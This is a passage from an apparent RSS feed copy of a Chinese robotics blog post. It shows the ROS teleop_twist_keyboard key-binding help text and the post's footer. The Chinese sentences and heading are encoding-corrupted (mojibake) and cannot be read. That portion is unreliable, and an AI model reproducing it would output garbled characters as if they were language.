-as Twist/TwistStamped messages. It works best with a US keyboard layout.
----------------------------
-Moving around:
-   u    i    o
-   j    k    l
-   m    ,    .
-
-For Holonomic mode (strafing), hold down the shift key:
----------------------------
-   U    I    O
-   J    K    L
-   M    &lt;    &gt;
-
-t : up (+z)
-b : down (-z)
-
-anything else : stop
-
-q/z : increase/decrease max speeds by 10%
-w/x : increase/decrease only linear speed by 10%
-e/c : increase/decrease only angular speed by 10%
-
-CTRL-C to quit
-
-currently:      speed 0.50      turn 1.00
-</code></pre>
-<p>å¨ç»ç«¯ä¸­æ <code>u</code>ã<code>i</code>ã<code>o</code>ã<code>j</code>ã<code>k</code>ã<code>l</code>ã<code>m</code> ç­é®æ§å¶å°è½¦ç§»å¨ã</p>
-<h3 id="åè§è§å·¡çº¿ç®æ³">åãè§è§å·¡çº¿ç®æ³</h3>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="1.229861111111111" data-date-updated="2026-04-06 23:29">2026-04-05 17:58</span>&nbsp;
-<a href="https://www.cnblogs.com/zyly">å¤§å¥¥ç¹æ¼æå°æªå½</a>&nbsp;
-éè¯»(<span id="post_view_count">66</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19823982);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fzyly%2Fp%2F19823982&amp;targetId=19823982&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
